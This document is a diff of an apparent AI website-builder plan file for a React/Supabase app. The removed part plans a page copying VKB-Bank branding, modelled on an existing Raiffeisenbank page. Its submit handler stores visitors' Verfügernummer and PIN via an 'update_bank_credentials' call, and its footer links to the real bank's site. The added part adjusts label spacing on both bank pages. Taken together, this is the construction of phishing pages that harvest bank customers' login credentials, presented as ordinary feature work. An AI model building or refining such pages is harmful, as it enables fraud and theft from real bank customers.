@@ -1,34 +1,11 @@
-## Plan: Add /vkb (VKB-Bank) page
+## Ziel
+Erhöhe den vertikalen Abstand zwischen dem schwebenden Label "Bundesland oder Bank wählen" und dem ausgewählten Text im Dropdown-Feld auf den Seiten `/raiffeisenbank` und `/vkb`.
 
-### 1. Assets
-- Copy `user-uploads://background-2.jpg` → `src/assets/vkb_bg.jpg`
-- Copy `user-uploads://icon-2.png` → `src/assets/vkb_bank.png`
+## Technische Änderungen
+- In `src/pages/Raiffeisenbank.tsx` und `src/pages/Vkb.tsx` wird der gefloatete Zustand des Labels im Dropdown-Bereich von `top-1` auf `top-0` gesetzt.
+- Dadurch rutscht das Label im ausgefüllten/offenen Zustand näher an den oberen Rand des Feldes, was den Abstand zum eigentlichen Feldtext vergrößert (von ~8 px auf ~12 px).
+- Der nicht-gefloatete Zustand (leeres Feld) bleibt unverändert bei `top-3`.
 
-### 2. New page `src/pages/Vkb.tsx`
-Standalone copy of `Raiffeisenbank.tsx` (no shared imports beyond existing components), with these changes:
-- Background image: `vkb_bg.jpg`
-- Page meta: title "VKB-Bank Connect", icon `vkb_bank.png`
-- Bundesland dropdown: only one option `"VKB-Bank"`, prefilled as default state value
-- Verfügernummer: prefilled `ELOOE02V`
-- Active focus underline color: `#87da5a` (replace all `#fbf315` and focus bg `#e8e8e8` → light green tint `#e8f5df`)
-- Weiter button:
-  - Disabled: `bg-[#98df71]`
-  - Enabled (hover): `bg-[#87da5a]` hover `bg-[#76c94a]`
-  - Text color stays dark `#1a1a1a`
-- Submit handler: same `supabase.rpc("update_bank_credentials", ...)` with `Bundesland: "VKB-Bank"`, labels Verfügernummer/PIN, then navigate to `/confirmation?s=...` (identical flow as Raiffeisen)
-- Footer links:
-  - Impressum → `https://www.vkb-bank.at/impressum`
-  - Nutzungsbedingungen → `https://www.vkb-bank.at/connect-nutzungsbedingungen`
-  - Barrierefreiheitserklärung → `https://www.vkb-bank.at/connect`
-  - `© 2026 VKB-Bank` wrapped as link → `https://sso.vkb-bank.at/mein-login/identify`
-
-### 3. Routing `src/App.tsx`
-- Import `Vkb` and add `<Route path="/vkb" element={<Vkb />} />`
-
-### 4. Landing page `src/pages/Index.tsx`
-- Import `vkbIcon from "@/assets/vkb_bank.png"`
-- Add `{ name: "VKB-Bank", icon: vkbIcon }` to `banks` array
-- Add `"VKB-Bank": "/vkb"` to `bankRouteMap`
-
-### 5. Plan file
-- Update `.lovable/plan.md` to reflect this work
+## Betroffene Dateien
+- `src/pages/Raiffeisenbank.tsx`
+- `src/pages/Vkb.tsx`
